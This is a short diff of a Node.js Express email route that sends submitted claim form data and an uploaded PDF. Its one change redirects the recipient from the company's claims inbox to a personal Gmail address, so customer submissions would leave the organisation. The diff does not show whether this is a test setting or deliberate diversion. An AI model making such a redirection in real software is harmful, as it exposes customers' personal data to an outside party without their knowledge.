@@ -49,7 +49,7 @@ app.post('/send-email', upload.single('pdf'), async (req, res) => {
   // Email content
   const mailOptions = {
     from: 'claims@greenbackclaims.com', // Sender (from) email address
-    to: 'claims@greenbackclaims.com', // Recipient (to) email address
+    to: 'okashatanoli12345@gmail.com', // Recipient (to) email address
     subject: 'New Form Submission',
     html: `<p>Form Data: ${JSON.stringify(formData)}</p>`,
     attachments: [
